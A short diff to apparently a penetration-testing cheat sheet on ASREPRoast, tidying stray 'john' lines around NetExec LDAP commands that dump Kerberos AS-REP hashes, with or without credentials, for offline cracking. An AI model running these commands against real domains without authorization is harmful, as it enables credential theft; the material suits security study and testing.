@@ -60,11 +60,11 @@ Two scenarios is possible ...
 == ASREPRoast
 
 This `command` returns hash of all users which doesn't have a Kerberos pre-authentication or not required
-john --show hash.john
+
 
 *Without Auth*
 
-```bashjohn --show hash.john
+```bash
 
 nxc ldap $target -u 'username' -p '' --asreproast output.txt
 ```
@@ -79,7 +79,7 @@ nxc ldap $target -u user.txt -p '' --asreproast output.txt
 ```
 
 *With authentication*
-john --show hash.john
+
 
 ```bash
 nxc ldap $target -u 'username' -p 'password' --asreproast output.txt
